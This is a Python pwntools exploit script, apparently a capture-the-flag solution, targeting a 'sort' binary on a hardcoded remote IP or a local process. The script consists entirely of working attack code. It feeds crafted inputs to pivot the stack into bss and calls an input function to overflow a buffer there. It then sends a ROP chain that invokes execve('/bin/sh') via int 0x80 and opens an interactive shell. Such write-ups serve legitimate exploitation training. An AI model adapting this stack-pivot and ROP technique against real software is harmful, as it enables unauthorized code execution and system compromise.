from pwn import *
import sys

if len(sys.argv)>1:
    r=remote('35.227.59.209',4545)
else:
    r=process('./sort')

ret_to=0x80eba88-4 # the addr (which is in bss) is the one we want main to ret to. -4 for pop ebp of leave.
pop_edx_ecx_ebx=0x0806fe00 # pop edx ; pop ecx ; pop ebx ; ret
pop_eax=0x08052b14 # pop eax ; ret
int80=0x0806da43 # int 0x80
getinp=0x0804887c # address of the getinp function

'''
Idea - stack pivot to bss, call getinp() with args - (addr in bss, a large size) - cause buffer
       overflow there (bss), and get shell using syscall rop chain.

Implementation -
        * The first 25 values are junk with only 1 contraint - they are (value) less than getinp
        * Then comes the func main will ret to (getinp)
        * Next is the return addr of getinp - junk - we'll overflow while sending payload (ropchain)
        * After that comes the args to getinp - address and size.
        * The next 2 values are junk needed to complete the 32 inputs required, with same contraint as 1st point.
        * Last is the ebp for sort() and esp at end of main(). It will point to addr where addr of getinp is present (point 2)
'''

r.sendlineafter("Enter the no. of elements to be sorted: ",'32')

r.recvuntil("Give me the no. : ")

'''Input the numbers to sort - '''

for i in range(25):
    r.sendline(str(0x08048870).ljust(31,'\x61')) # these are just junk values.

r.send(str(getinp).ljust(32,'\x00')) # ret addr
r.send(str(getinp+1).ljust(32,'\x00')) # ret + 4
r.send(str(ret_to-8).ljust(32,'\x00')) # arg1
r.send(str(ret_to-1).ljust(32,'\x00')) # arg2
r.send(str(ret_to-1).ljust(32,'\x00')) # jnk
r.send(str(ret_to-1).ljust(32,'\x00')) # jnk
r.sendline(str(ret_to)) # ebp / esp
log.info("Sent elements")

''' ROP Chain : - '''

payload="/bin/sh\x00aaaaaaaa"
payload+=p32(pop_eax)+p32(0x80eba20)
payload+=p32(pop_edx_ecx_ebx)
payload+=p32(0)
payload+=p32(0)
payload+=p32(0x80eba7c)
payload+=p32(pop_eax)
payload+=p32(0xb)
payload+=p32(int80)

r.recvuntil("Here's the sorted list :")

log.info("Payload Sent")
r.sendline(payload)
r.interactive()
